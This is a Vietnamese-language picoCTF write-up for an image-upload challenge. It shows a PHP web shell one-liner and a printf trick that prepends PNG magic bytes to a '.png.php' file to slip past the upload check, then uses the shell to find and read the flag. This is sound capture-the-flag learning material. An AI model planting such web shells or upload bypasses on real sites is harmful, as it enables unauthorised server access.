![image](https://github.com/user-attachments/assets/7271d8a4-2a6f-4937-ae93-4e9b9d9c8880)

I found a web app that can help process images: PNG images only!

# TLDR
Web này check file được đưa vào, chỉ cần có `.png` và có file signature của png thì được chấp nhận

Tạo một file PHP để tạo 1 shell và thực hiện trên web, cho file đó signature của PNG với đuôi là `.png.php` sau đó tìm file `.txt` trên server 

Tên file flag được decode = base32

# Upload thử các loại file 
Nếu upload 1 file PNG bình thường sẽ báo thành công

![image](https://github.com/user-attachments/assets/a96fc19c-af2d-4a2d-a090-d2c7d971421c)

Tất nhiên là đợi bao lâu sẽ không được gì từ đó ta có hướng giải là tạo một file PHP tạo 1 shell sau đó sẽ dùng nó để đọc file flag

Để tạo một shell = PHP trên web ta dùng `<?php system($_GET['cmd']); ?>`

Thử upload một file và chỉ thêm đuôi png

![image](https://github.com/user-attachments/assets/13db7e7d-a854-448b-a209-6b88fbaf3cf8)

Web báo lỗi đây không phải file PNG hợp lệ dù cho ta đã dùng đuôi `.png` và sau đó có mã: `3c3f7068`

Nếu xem hexdump của normalPHP.png ta biết rằng đây là "magic number" của file này. Vậy là server kiểm tra xem 1 file có đuôi `.png` không và có file signature của `.png` không

![image](https://github.com/user-attachments/assets/9205b6c0-df8e-40cc-91e6-ef445926953f)

# Đưa code PHP vào file PNG
Để biến một file bình thường thành PNG ta có thể dùng `printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A" > betterPHP.png.php` để tạo một file mới mang signature của PNG
![image](https://github.com/user-attachments/assets/de862741-e002-4568-8c14-a3fbadd41bd2)

Sau đó đưa dữ liệu từ normalPHP.png vào, dùng `>>` để thêm dữ liệu vào file, nếu chỉ dùng `>` sẽ ghi đè lên dữ liệu cũ và làm mất file signature của PNG

![image](https://github.com/user-attachments/assets/39db3730-d172-4f02-8882-6f1cee45d62d)

# Upload file "betterPHP.png.php" đã được nguỵ trang
![image](https://github.com/user-attachments/assets/5f623c61-5cde-484a-a9d8-c1f464982f25)

Thành công, giờ ta có thể truy cập và thực hiện lệnh bằng link `http://atlas.picoctf.net:58019/uploads/betterPHP.png.php?cmd=NHẬP LỆNH VÀO`

![image](https://github.com/user-attachments/assets/3ac19f78-d11a-4330-bd9f-98947a698d60)

User tên là www-data 

# Tìm flag
Để tìm flag ta dùng câu lệnh find mọi file `.txt` trong web

![image](https://github.com/user-attachments/assets/50de2b56-d7fa-40e2-be32-4cb13d9f3256)

Tên file toàn chữ hoa `MFRDAZLDMUYDG.txt` kia đã được mã hoá = base32, nếu decode sẽ cho ra `flag.txt `

Chỉ cần đọc file sẽ thấy flag

![image](https://github.com/user-attachments/assets/c24a45b3-50c2-47e5-a599-a0f04a0ce97a)

# FLAG: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03}
